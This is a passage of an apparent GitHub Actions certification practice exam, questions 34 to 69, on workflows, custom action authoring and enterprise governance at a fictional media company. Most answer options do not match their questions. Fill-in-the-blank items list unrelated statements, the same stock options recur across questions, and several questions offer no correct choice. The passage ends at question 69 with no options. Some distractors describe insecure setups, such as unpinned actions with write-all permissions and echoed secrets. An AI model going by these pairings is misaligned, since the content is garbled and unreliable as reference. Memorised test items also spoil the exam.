- **B.** Correlate failed matrix job titles to `matrix.*` axes and select `Re-run failed jobs` (`gh run rerun <id> --failed` or single-job rerun) to re-test without re-billing green legs
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 34. A media operations bot queries `GET /repos/solsticecloud/transcode-svc/actions/workflows/encode.yml/runs?branch=main&event=push&status=completed` to compute weekly MTTR. Can `{workflow_id}` in `/actions/workflows/{workflow_id}/runs` be the filename `encode.yml` as well as the numeric workflow ID?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 35. An engineer debugging `solsticecloud/drm-signer` from an headless Linux workstation uses GitHub CLI (`gh`) to inspect workflow definitions, trigger a manual run, and stream step logs. Which two `gh` commands are valid? Select two.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **E.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **F.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)

### 36. In `solsticecloud/transcode-svc`, job `encode` uploads `sample-4k.mp4` (`already H.265 compressed binary media`) using `actions/upload-artifact@v4`, and gzip compression wastes 45 seconds of CPU for 0% size reduction. Complete the `actions/upload-artifact@v4` input `____: 0` that skips zip deflate compression for pre-compressed media files.

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 37. In `solsticecloud/cdn-edge`, 6 regional test legs run in parallel and each calls `actions/upload-artifact@v4` with static `name: latency-csv`. Proposed solution: Keep identical `name: latency-csv` across all 6 parallel jobs so `upload-artifact@v4` concatenates them into a single zip archive. Does this meet the goal?

- **A.** Give each matrix job a unique `upload-artifact@v4` name (`artifact-${{ matrix.os }}`) and merge them downstream with `download-artifact@v4` (`pattern: artifact-*`, `merge-multiple: true`)
- **B.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **C.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 38. In `solsticecloud/cdn-edge`, caller workflow `release.yml` calls `jobs.sign.uses: solsticecloud/ci-shared/.github/workflows/cosign.yml@9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1098` without passing a `secrets:` block (`and without secrets: inherit`). Inside `cosign.yml`, can steps still access `${{ secrets.COSIGN_KEY }}` defined on caller repo `solsticecloud/cdn-edge`?

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 39. Can a workflow in `solsticecloud/transcode-svc` call a reusable workflow defined inside the SAME repository (`uses: ./.github/workflows/reusable-test.yml`) so it tests changes to `reusable-test.yml` inside the same feature-branch PR commit?

- **A.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 40. SolsticeCloud Media maintains 80 Rust microservices created last year from starter template `solsticecloud/.github/workflow-templates/rust-ci.yml`. Security wants to add `cargo-audit` to all 80 existing repositories overnight without opening PRs in those 80 repos. Proposed solution: Edit `solsticecloud/.github/workflow-templates/rust-ci.yml` to add the `cargo-audit` step. Does this meet the goal?

- **A.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **B.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **C.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **D.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)

### 41. SolsticeCloud Media's GitHub Free organization `solstice-open-labs` (`not on GitHub Enterprise`) creates a `Private` `.github` repository with `workflow-templates/go.yml` and wonders why private repos do not see the starter template. Which two visibility/plan rules explain starter templates? Select two.

- **A.** Publish one-time scaffold templates in `<org>/.github/workflow-templates/*.yml` + `.properties.json`, and centralize ongoing governed CI logic in `workflow_call` reusable workflows
- **B.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **E.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)
- **F.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 42. An obsolete workflow file `.github/workflows/retired-hls-v1.yml` is deleted from `main` in `solsticecloud/transcode-svc`, yet remains present on an unmerged 8-month-old archive branch `archive/v1`. Can `push` events to `archive/v1` still trigger `retired-hls-v1.yml` unless disabled or filtered?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 43. Complete the GitHub CLI command to list all workflows in `solsticecloud/cdn-edge` INCLUDING workflows currently in `disabled_manually` or `disabled_inactivity` state: `gh workflow ____ --all`.

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

---

## Domain 3 — Author and maintain actions (15–20% official weight · 19 questions)

### 44. SolsticeCloud Media builds TypeScript action `solsticecloud/hls-manifest-verify` (`runs.using: 'node20'`). In the action's own CI workflow, which check prevents developers from editing `src/index.ts` in a PR while forgetting to rebuild `dist/index.js`?

- **A.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **D.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 45. Inside `solsticecloud/hls-manifest-verify` (`node20`), your script needs to locate `ffprobe` on the runner's `PATH` or copy/mkdir artifacts cross-platform (`Linux, macOS, Windows`) without shelling out to `which`/`where` or `rm -rf`. Which official GitHub Actions Toolkit package provides cross-OS `which`, `cp`, `mv`, `rmRF`, and `mkdirP`?

- **A.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 46. SolsticeCloud Media creates and releases cross-OS `node20` TypeScript action `solsticecloud/c2pa-media-verify`. Place the `action.yml` metadata, `@actions/core` error handling, `@vercel/ncc` `dist/` bundling, and SemVer/SHA release steps in exact order.

- **A.** Place `action.yml` inside `.github/workflows/` with no root metadata → Set `runs.using: "docker"` for a macOS/Windows helper action → Log secret inputs via `console.log` → Skip SemVer tags completely
- **B.** Gitignore both `dist/` and `node_modules/` in the release commit → Set `runs.using: "node12"` in `action.yml` → Exit raw processes without `@actions/core` → Tell consumers to reference floating `@main` only
- **C.** Cut release `v1.0.0` before authoring `action.yml` → Require every caller repo to run `npm install` first → Embed static caller tokens inside `dist/index.js` → Delete the Git tag right after release
- **D.** Author `action.yml` (`using: "node20"`, `main: "dist/index.js"`) → Code with `@actions/core` & `core.setFailed()` → Bundle into `dist/index.js` (`@vercel/ncc`) & commit `dist/` → Tag `v1.0.0`, slide `v1`, and document the 40-char SHA

### 47. SolsticeCloud Media builds tvOS/macOS FairPlay player SDKs on `macos-15` runners and Windows PlayReady SDKs on `windows-2025` runners, needing a custom manifest-checksum action. Proposed solution: Implement the checksum action as a Docker container action (`runs.using: 'docker'`) so macOS and Windows jobs run the identical Alpine container. Does this meet the goal?

- **A.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **B.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **C.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **D.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)

### 48. In `solsticecloud/ffmpeg-static-composite/action.yml` (`runs.using: 'composite'`), step 2 runs PowerShell on Windows and step 1 runs Bash on Linux/macOS (`using step if: runner.os == 'Windows'`). Complete the mandatory key `____: pwsh` on the Windows `run:` step inside the Composite action.

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **C.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 49. SolsticeCloud Media's engineering guide compares logging and step nesting across Composite actions vs JavaScript/Docker actions. Which two behaviors apply to Composite actions? Select two.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **C.** Declare `runs.using: "composite"` in `action.yml`, specify `shell:` on every `run:` step, and reference helper scripts via `${{ github.action_path }}`
- **D.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **E.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **F.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)

### 50. SolsticeCloud Media publishes `solsticecloud/c2pa-media-verify` `v1.3.0` with Immutable Actions enabled. How does Immutable Actions protect downstream consumers if a maintainer's Git push credentials are later compromised?

- **A.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 51. A `node20` custom action starts a background `setInterval()` metrics timer and never calls `clearInterval()` (`nor unref()`), causing the GitHub Actions step to hang indefinitely after `main()` finishes until `timeout-minutes` kills the job! How should the action fix this?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)
- **C.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 52. In `action.yml` for `solsticecloud/c2pa-media-verify`, you define `inputs: manifest_path: { description: 'Path to C2PA jumbf', required: true }` (`with NO default`). If a caller omits `with: manifest_path` in YAML, does GitHub Actions automatically fail BEFORE launching Node 20, or must your JS code validate it?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **D.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`

### 53. In `action.yml` for a Docker container action (`runs.using: 'docker'`), complete the `runs:` property `____: ['--strict', '${{ inputs.manifest_path }}']` that passes CLI arguments into the container's `ENTRYPOINT`.

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 54. You audit `solsticecloud/c2pa-media-verify` (`node20`) before its `v1.0.0` security sign-off. Which three practices align with GitHub's official custom-action authoring guidelines? Select three.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **C.** Target `runs.using: "node20"` in `action.yml` and commit compiled `dist/index.js` (`bundled with @vercel/ncc or esbuild`) so consumers skip `npm install`
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **E.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **F.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`

### 55. In `solsticecloud/c2pa-media-verify` (`node20`), your action verifies a media signature and wants to attach a green informational callout (`not a warning or error`) to the run's Annotations panel. Complete the `@actions/core` method: `core.____('C2PA manifest verified against root CA', { title: 'C2PA Provenance' })`.

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first

### 56. Inside a Docker container action's POSIX shell `entrypoint.sh`, how does the container export output `signature_alg=ES256` to the caller workflow step (`${{ steps.c2pa.outputs.signature_alg }}`)?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 57. SolsticeCloud Media maintains proprietary DRM watermarking algorithms inside `solsticecloud-drm/watermark-action` (`Private` repository in org `solsticecloud-drm`) that ONLY `3` repositories inside `solsticecloud-drm` should ever invoke (`NOT other orgs in the Enterprise`). Which `Access` setting fits?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

### 58. When distributing a Docker container action to enterprise consumers where sub-5-second step startup and zero `Dockerfile` rebuild risk are mandatory, should `action.yml` reference `image: 'Dockerfile'` or `image: 'docker://ghcr.io/...'`?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories

### 59. SolsticeCloud Media open-sources `solsticecloud/hls-playlist-lint` (`node20`) and wants `v1.0.0` published to the public GitHub Marketplace. Order the public single-action repo setup, `action.yml`/branding/README check, `2FA`/Developer Agreement, and Release publication steps.

- **A.** Create a `Public` single-action repo with root `action.yml` → Add unique `name`, `description`, `README`, & `branding` → Enable `2FA` & accept the Marketplace Developer Agreement → Draft a Release (`v1.0.0`) checking `Publish to Marketplace`
- **B.** Reuse an existing official action `name` (`actions/checkout`) → Hide `action.yml` inside `.github/workflows/` → Email a `.zip` archive to GitHub Support → Tag `0.0.0-draft` without release notes
- **C.** Publish from an EMU user account (`where public repos are blocked`) → Omit `description` and `runs:` from `action.yml` → Commit production `.env` secrets into the repo → Use mutable tag `latest` only
- **D.** Keep the action repository `Private` or `Internal` → Pack 6 actions in subfolders with no root `action.yml` → Skip `2FA` and the Marketplace Developer Agreement → Push branch `dev` without drafting a GitHub Release

### 60. How does an organization earn the `Verified creator` badge next to its published GitHub Actions in GitHub Marketplace?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 61. A security patch `v2.4.1` is released for `solsticecloud/hls-playlist-lint`, while legacy branch `v1` is still maintained at `v1.9.3`. When releasing `v2.4.1`, which floating major/minor tags should move to the `v2.4.1` commit?

- **A.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 62. SolsticeCloud Media audits consumer repositories to eliminate `uses: org/action@main` and `uses: org/action@HEAD` references. Which two risks occur when workflows reference floating branches (`@main`) instead of 40-char commit SHAs + Immutable Actions? Select two.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **E.** Publish immutable SemVer releases (`v1.2.3`), slide major tag `v1` for compatible updates, and encourage consumers to pin full 40-char commit SHAs (`with Immutable Actions`)
- **F.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

---

## Domain 4 — Manage GitHub Actions for the enterprise (20–25% official weight · 24 questions)

### 63. SolsticeCloud Media enforces central workflow `solsticecloud/sec-ci/.github/workflows/secret-hygiene.yml` via an Enterprise Repository Ruleset across 95 repositories. Inside `secret-hygiene.yml`, which `on:` trigger is required so Repository Ruleset merge checks evaluate it on every pull request?

- **A.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**

### 64. SolsticeCloud Media's platform team hosts `25` reusable workflows in `solsticecloud/ci-shared` (`Internal`). To inspect which repositories across the organization invoke `ci-shared` workflows and catch deprecated `@v1` callers before retiring `v1`, which telemetry sources help?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 65. A squad wants to test a proposed modification to enterprise required workflow `secret-hygiene.yml` inside a sandbox repository BEFORE rolling the new ref out to all 95 production repositories in the Enterprise Ruleset. How do Rulesets support safe staged rollouts?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 66. SolsticeCloud Media acquires studio `aurora-vfx`, adding organization `aurora-vfx` into the `solsticecloud` GitHub Enterprise Cloud account. Workflows in `aurora-vfx` (`Private` repos) need to call `solsticecloud-core/media-actions` (`Internal` repo in org `solsticecloud-core`). Complete the `Access` setting in `solsticecloud-core/media-actions`: `Accessible from repositories in the '____' enterprise`.

- **A.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 67. If an Organization Owner changes `Organization -> Settings -> Actions -> General -> Workflow permissions` from `Read and write permissions` to `Read repository contents and packages permissions`, what should existing workflows that push tags or post PR comments add to avoid `403` errors?

- **A.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)

### 68. Can a `Public` open-source repository `solsticecloud/open-hls-player` invoke a reusable workflow hosted in `Internal` repository `solsticecloud/ci-shared`, even if both repositories belong to the `solsticecloud` organization?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 69. SolsticeCloud Media configures `Allowed actions and reusable workflows` -> `Allow solsticecloud, and select non-solsticecloud, actions and reusable workflows` AND checks `Require actions to be pinned to a full-length commit SHA`. Does `Require actions to be pinned to a full-length commit SHA` also apply to external Marketplace actions matched by allowlist patterns (`like aws-actions/*`)?

